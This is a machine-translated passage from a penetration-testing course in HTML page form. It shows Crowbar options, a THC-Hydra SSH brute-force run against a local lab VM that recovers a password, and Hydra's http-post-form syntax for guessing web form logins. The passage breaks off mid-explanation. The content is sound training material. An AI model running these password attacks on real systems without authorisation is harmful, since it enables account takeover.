<div style="position:absolute;top:166283;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">静态目标</font></font></nobr></div>
<div style="position:absolute;top:166300;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-S SERVER_FILE, --serverfile SERVER_FILE</font></font></nobr></div>
<div style="position:absolute;top:166316;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多个目标存储在一个文件中</font></font></nobr></div>
<div style="position:absolute;top:166333;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-u 用户名 [用户名 ...], --username 用户名 [用户名 ...]</font></font></nobr></div>
<div style="position:absolute;top:166350;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于登录的静态名称</font></font></nobr></div>
<div style="position:absolute;top:166367;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-U USERNAME_FILE, --usernamefile USERNAME_FILE </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:166495;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="141"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 141 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:166528;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:167605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:167605;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:167605;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">582</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:166624;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多个登录名，存储在一个文件中</font></font></nobr></div>
<div style="position:absolute;top:166640;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n 线程，--number 线程</font></font></nobr></div>
<div style="position:absolute;top:166657;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一次活动的线程数</font></font></nobr></div>
<div style="position:absolute;top:166674;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l FILE, --log FILE 日志文件（仅写入尝试）</font></font></nobr></div>
<div style="position:absolute;top:166692;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-o 文件，--输出文件</font></font></nobr></div>
<div style="position:absolute;top:166708;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出文件（写入其他所有内容）</font></font></nobr></div>
<div style="position:absolute;top:166725;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-c 密码，--passwd 密码</font></font></nobr></div>
<div style="position:absolute;top:166742;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于登录的静态密码</font></font></nobr></div>
<div style="position:absolute;top:166759;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-C 文件, --passwdfile 文件</font></font></nobr></div>
<div style="position:absolute;top:166776;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于登录的多个密码，存储在一个文件中</font></font></nobr></div>
<div style="position:absolute;top:166793;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-t 超时, --timeout 超时</font></font></nobr></div>
<div style="position:absolute;top:166810;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[SSH] 每个线程等待多长时间（秒）</font></font></nobr></div>
<div style="position:absolute;top:166827;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p PORT, --port PORT 如果服务未使用默认端口，则更改端口</font></font></nobr></div>
<div style="position:absolute;top:166844;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">价值</font></font></nobr></div>
<div style="position:absolute;top:166861;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-k KEY_FILE, --keyfile KEY_FILE</font></font></nobr></div>
<div style="position:absolute;top:166878;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[SSH/VNC]（私有）密钥文件或文件夹包含</font></font></nobr></div>
<div style="position:absolute;top:166895;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多个文件</font></font></nobr></div>
<div style="position:absolute;top:166912;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-m 配置, --config 配置</font></font></nobr></div>
<div style="position:absolute;top:166929;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">【OpenVPN】配置文件</font></font></nobr></div>
<div style="position:absolute;top:166946;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d, --discover    </font></font></nobr></div>
<div style="position:absolute;top:166946;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击开放端口前的端口扫描</font></font></nobr></div>
<div style="position:absolute;top:166963;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-v, --verbose    </font></font></nobr></div>
<div style="position:absolute;top:166963;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用详细输出（-vv 了解更多）</font></font></nobr></div>
<div style="position:absolute;top:166980;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-D, --debug    </font></font></nobr></div>
<div style="position:absolute;top:166980;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用调试模式</font></font></nobr></div>
<div style="position:absolute;top:166997;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-q, --安静    </font></font></nobr></div>
<div style="position:absolute;top:166997;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只显示成功登录</font></font></nobr></div>
<div style="position:absolute;top:167033;left:364"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 607 - Crowbar 帮助输出</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:167064;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.3.2.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:167099;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（这些练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:167131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 创建一个包含您的 Windows 客户端密码的密码列表，并使用它来重复</font></font></nobr></div>
<div style="position:absolute;top:167151;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面针对 Windows 客户端的 Crowbar 密码攻击。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:167185;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.3.3</font></font></i></nobr></div>
<div style="position:absolute;top:167185;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 THC-Hydra 进行 SSH 攻击</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:167223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">THC-Hydra 是另一个正在积极开发中的强大网络服务攻击工具，它是</font></font></nobr></div>
<div style="position:absolute;top:167243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值得掌握。</font><font style="vertical-align: inherit;">我们可以用它来攻击多种协议认证方案，包括</font></font></nobr></div>
<div style="position:absolute;top:167262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH 和 HTTP。</font></font></nobr></div>
<div style="position:absolute;top:167295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准选项包括</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定目标用户名，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-P</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定一个词表，以及</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:167315;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">protocol://IP</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别指定目标协议和IP地址。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:167347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在第一个示例中，我们将攻击 Kali VM。</font><font style="vertical-align: inherit;">我们将在本地机器上使用 SSH 协议</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:167367;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh://127.0.0.1 </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，关注kali用户（</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l kali </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），再次使用rockyou词表（</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-P </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:167401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1</font></font></font></b></nobr></div>
<div style="position:absolute;top:167418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hydra v8.8 (c) 2019 by van Hauser/THC - 请不要在军事或秘密服务中使用</font></font></nobr></div>
<div style="position:absolute;top:167452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hydra (https://github.com/vanhauser-thc/thc-hydra) 2019-06-07 08:35:59 开始</font></font></nobr></div>
<div style="position:absolute;top:167469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[警告] 许多 SSH 配置限制并行任务的数量，建议</font></font></nobr></div>
<div style="position:absolute;top:167486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[数据] 每 1 个服务器最多 16 个任务，总共 16 个任务，14344399 次登录尝试 (l:1/p:143443</font></font></nobr></div>
<div style="position:absolute;top:167503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[数据] 攻击 ssh://127.0.0.1:22/</font></font></nobr></div>
<div style="position:absolute;top:167520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[22][ssh] 主机：127.0.0.1   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录名：kali 密码：随便</font></font></font></b></nobr></div>
<div style="position:absolute;top:167537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 个目标中的 1 个成功完成，找到 1 个有效密码</font></font></nobr></div>
<div style="position:absolute;top:167554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hydra (https://github.com/vanhauser-thc/thc-hydra) 完成于 2019-06-07 08:36:13 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:167683;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="142"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 142 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:167716;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:168793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:168793;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:168793;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">583</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:167812;left:354"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 608 - 使用 Hydra 的 SSH 攻击</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:167841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此输出中，我们可以看到 hydra 发现了对本地 SSH 服务器的有效登录。</font></font></nobr></div>
<div style="position:absolute;top:167874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">THC-Hydra 支持许多标准协议和服务，如清单 609 所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:167909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hydra</font></font></font></b></nobr></div>
<div style="position:absolute;top:167926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hydra v8.8 (c) 2019 by van Hauser/THC - 请不要在军事或秘密服务中使用</font></font></nobr></div>
<div style="position:absolute;top:167960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语法：hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | </font><font style="vertical-align: inherit;">[-C 文件]] [-e nsr] [-o 文件]</font></font></nobr></div>
<div style="position:absolute;top:167977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-t 任务] [-M 文件 [-T 任务]] [-w 时间] [-W 时间] [-f] [-s 端口] [-x MIN:MAX:CHARSET</font></font></nobr></div>
<div style="position:absolute;top:167994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">] [-c 时间] [-ISOuvVd46] [service://server[:PORT][/OPT]]</font></font></nobr></div>
<div style="position:absolute;top:168011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:168028;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">支持的服务：adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]</font></font></b></nobr></div>
<div style="position:absolute;top:168044;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc</font></font></b></nobr></div>
<div style="position:absolute;top:168061;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcany</font></font></b></nobr></div>
<div style="position:absolute;top:168079;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其中 pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip</font></font></b></nobr></div>
<div style="position:absolute;top:168096;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teampeak telnet[s] vmauthd vnc xmpp</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:168112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:168132;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 609 - THC-Hydra 支持的模块</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:168163;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.3.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:168197;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（这些练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:168230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 对您的 Kali VM 重新创建 Hydra SSH 攻击。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:168265;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.3.4</font></font></i></nobr></div>
<div style="position:absolute;top:168265;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 THC-Hydra 进行 HTTP POST 攻击</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:168302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为附加示例，我们将对 Windows Apache 执行 HTTP POST 攻击</font></font></nobr></div>
<div style="position:absolute;top:168322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器使用 Hydra。</font><font style="vertical-align: inherit;">当一个 HTTP POST 请求用于用户登录时，它通常是通过</font></font></nobr></div>
<div style="position:absolute;top:168341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用网络表单，这意味着我们应该使用“http-form-post”服务模块。</font><font style="vertical-align: inherit;">我们可以供应</font></font></nobr></div>
<div style="position:absolute;top:168361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务名称后跟</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-U</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以获取有关所需参数的附加信息：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:168395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hydra http-form-post -U</font></font></font></b></nobr></div>
<div style="position:absolute;top:168412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:168429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块 http-post-form 的帮助：</font></font></nobr></div>
<div style="position:absolute;top:168447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==========================</font></font></nobr></div>
<div style="position:absolute;top:168463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块 http-post-form 需要页面和 Web 表单的参数。</font></font></nobr></div>
<div style="position:absolute;top:168497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，此模块配置为遵循最多 5 个重定向</font></font></nobr></div>
<div style="position:absolute;top:168514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一排。</font><font style="vertical-align: inherit;">它总是从没有变量的同一个 URL 中收集一个新的 cookie</font></font></nobr></div>
<div style="position:absolute;top:168531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数采用三个“:”分隔值以及可选值。</font></font></nobr></div>
<div style="position:absolute;top:168548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（注意：如果您需要在选项字符串中使用冒号作为值，请使用“\:”对其进行转义，但请执行</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:168582;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语法：&lt;url&gt;:&lt;表单参数&gt;:&lt;条件字符串&gt;[:&lt;可选&gt;[:&lt;可选&gt;]</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:168599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先是服务器上要 GET 或 POST 到（URL）的页面。</font></font></nobr></div>
<div style="position:absolute;top:168616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其次是 POST/GET 变量（取自浏览器、代理等。</font></font></nobr></div>
<div style="position:absolute;top:168633;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 url 编码（或 base64 编码）的用户名和密码在</font></font></nobr></div>
<div style="position:absolute;top:168650;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“^USER^”（对应“^USER64^”）和“^PASS^”（对应“^PASS64^”）占位符（FORM PARAME）</font></font></nobr></div>
<div style="position:absolute;top:168667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第三个是它检查*无效*登录的字符串（默认情况下）</font></font></nobr></div>
<div style="position:absolute;top:168684;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无效条件登录检查前面可以加“F=”，成功条件</font></font></nobr></div>
<div style="position:absolute;top:168701;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录检查必须以“S=”开头。</font></font></nobr></div>
<div style="position:absolute;top:168718;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是大多数人误解的地方。</font><font style="vertical-align: inherit;">你必须检查 webapp 是什么</font></font></nobr></div>
<div style="position:absolute;top:168735;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">失败的字符串看起来像并把它放在这个参数中！ </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:168871;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="143"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 143 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:168904;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:169981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:169981;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:169981;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">584</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:169000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下参数是可选的：</font></font></nobr></div>
<div style="position:absolute;top:169016;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C=/page/uri 定义一个不同的页面来收集初始 cookie</font></font></nobr></div>
<div style="position:absolute;top:169033;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(h|H)=My-Hdr\: foo 为每个请求发送用户定义的 HTTP 标头</font></font></nobr></div>
<div style="position:absolute;top:169050;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^USER[64]^ 和 ^PASS[64]^ 也可以放入这些头文件中！</font></font></nobr></div>
<div style="position:absolute;top:169068;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意：'h' 将在末尾添加用户定义的标头</font></font></nobr></div>
<div style="position:absolute;top:169084;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不管它是否已经由 Hydra 发送。</font></font></nobr></div>
<div style="position:absolute;top:169101;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'H' 将替换该标头的值（如果存在），</font></font></nobr></div>
<div style="position:absolute;top:169118;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由用户提供，或在末尾添加标题</font></font></nobr></div>
<div style="position:absolute;top:169135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，如果您要将冒号 (:) 放在标题中，则应该将它们转义</font></font></nobr></div>
<div style="position:absolute;top:169152;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有不是选项分隔符的冒号都应该被转义（参见上面的例子</font></font></nobr></div>
<div style="position:absolute;top:169169;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可以在不转义冒号的情况下指定标题，但这样您就不会成为 ab</font></font></nobr></div>
<div style="position:absolute;top:169186;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在标头值本身中，因为它们将被 hydra 解释为选项分隔符</font></font></nobr></div>
<div style="position:absolute;top:169203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:169222;left:262"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 610 - 关于 http-form-post 模块的附加信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:169252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从这个输出中，我们确定我们需要提供一些需要我们的参数</font></font></nobr></div>
<div style="position:absolute;top:169271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行一些应用程序发现。</font><font style="vertical-align: inherit;">首先，我们需要网页的IP地址和URL</font></font></nobr></div>
<div style="position:absolute;top:169291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含我们 Windows 客户端上的 Web 表单。</font><font style="vertical-align: inherit;">IP 地址将作为第一个提供</font></font></nobr></div>
<div style="position:absolute;top:169310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对九头蛇的争论。</font></font></nobr></div>
<div style="position:absolute;top:169343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们必须通过检查 HTML 代码来了解我们想要暴力破解的 Web 表单</font></font></nobr></div>
<div style="position:absolute;top:169362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有问题的网页（位于 /form/login.html）。</font></font></nobr></div>
<div style="position:absolute;top:169395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图294 右击页面选择View后目标web表单的代码</font></font></nobr></div>
<div style="position:absolute;top:169415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上下文菜单中的页面源：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:169741;left:353"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 294：Web 表单的源代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:169772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面的表单，/form/login.html 页面的一部分，表示 POST 请求是由</font></font></nobr></div>
<div style="position:absolute;top:169791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/form/frontpage.php，这是我们将提供给 Hydra 的 URL。</font><font style="vertical-align: inherit;">清单 610 中显示的语法</font></font></nobr></div>
<div style="position:absolute;top:169811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要表单参数，在这种情况下是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pass</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">由于我们正在攻击</font></font></nobr></div>
<div style="position:absolute;top:169830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">admin 用户使用 wordlist 登录，Hydra 的组合参数变为</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
